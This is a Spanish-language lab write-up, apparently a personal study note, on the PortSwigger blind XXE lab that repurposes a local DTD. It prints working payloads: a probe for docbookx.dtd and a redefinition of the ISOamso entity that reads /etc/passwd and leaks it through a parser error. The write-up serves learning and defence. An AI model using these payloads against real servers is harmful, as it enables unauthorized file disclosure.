---
aliases:
  - XXE 008 - reutilizar DTD local
  - blind xxe local dtd
  - repurpose local dtd docbookx
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 008 — XXE ciego: reutilizar un DTD local (sin salida a internet)

> Lab: [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd) · **Expert** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

## ¿Por qué acá? (el último recurso)
- **Vengo de [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]] y [[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007]]:** ambos necesitan **cargar un DTD externo** (exploit server) o un **canal OOB**.
- **Por qué no me alcanza:** el server **no sale a internet** — no puedo cargar un DTD externo, no hay OOB, **y** las entidades encadenadas no se pueden declarar internamente (lo mismo que forzó a 006 a salir afuera). Nada de lo anterior funciona.
- **Entonces:** reutilizo un **DTD que ya está en el disco** del server y **redefino una entidad suya** para inyectar el error-based — **todo local, sin internet**.

## Cómo explotarlo

### 1. Encontrar un DTD local (paso previo)

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).

Confirmás que existe un DTD conocido cargándolo solo. El estándar es el de GNOME **`yelp`**:
<pre><code>POST /product/stock HTTP/1.1
Host: <mark>TARGET.web-security-academy.net</mark>
Content-Type: application/xml

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "<mark>file:///usr/share/yelp/dtd/docbookx.dtd</mark>"&gt;
%local_dtd;
]&gt;
&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
Si **no** da error de "archivo no encontrado" → existe → seguí.

> [!tip] ¿No existe `docbookx.dtd`? Probá otras rutas
> Recorré la [[vulnerabilities/006-xxe/resources/dtd_files|wordlist de DTDs locales]] (rutas conocidas de Linux/Java/JBoss/Tomcat + Windows) hasta dar con un DTD que exista; después redefinís una entidad **suya** en el paso 2.

### 2. El ataque — redefinir una entidad del DTD local
En `docbookx.dtd` existe la entidad de parámetro `ISOamso`. La **redefinís**:
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "<mark>file:///usr/share/yelp/dtd/docbookx.dtd</mark>"&gt;
&lt;!ENTITY % <mark>ISOamso</mark> '
&lt;!ENTITY &amp;#x25; file SYSTEM "<mark>file:///etc/passwd</mark>"&gt;
&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
&amp;#x25;eval;
&amp;#x25;error;
'&gt;
%local_dtd;
]&gt;
&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>

## Cómo fluye (diagrama)

```mermaid
sequenceDiagram
    autonumber
    participant A as Atacante
    participant P as XML Parser
    participant F as Filesystem
    participant App as Aplicación
    A->>P: XML con DOCTYPE que carga el DTD local
    P->>F: Leer docbookx.dtd (DTD local del server)
    F-->>P: Contenido del DTD
    rect rgb(60, 60, 70)
        Note over P: ISOamso existe en docbookx.dtd<br/>Mi DOCTYPE la redefine con el ataque
    end
    P->>F: Leer /etc/passwd
    F-->>P: Contenido del archivo
    P->>F: Abrir file:///nonexistent/CONTENIDO
    F-->>P: File not found
    rect rgb(70, 60, 60)
        P-->>A: XML parsing error CON el contenido de /etc/passwd
    end
    P--xApp: La aplicación nunca procesa el XML (falló el parseo)
```

## Verificación
La respuesta trae el `FileNotFoundException` con `/etc/passwd` embebido (como [[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007]], pero **sin server externo**).

## Detalles que se pasan por alto
- **`ISOamso` debe existir DENTRO de `docbookx.dtd`.** Al cargar el DTD local, tu redefinición gana y dispara el ataque. Con otro DTD local → redefinís una entidad **suya**.
- **Escapado doble:** dentro de un valor de entidad que declara entidades, `%` = `&#x25;` y `&` = `&#x26;`. Por eso aparece `&#x26;#x25;` (un `%` doblemente escapado) y `&#x27;` (comilla simple).
- **No usa exploit server ni Collaborator** — esa es la gracia: funciona con el server **aislado de internet**. Es el más rebuscado porque **nada de 001–007 aplicaba**.
- `docbookx.dtd` es el candidato estándar (viene con `yelp`); hay otras rutas de DTD locales (ver la wordlist referenciada en el paso 1).
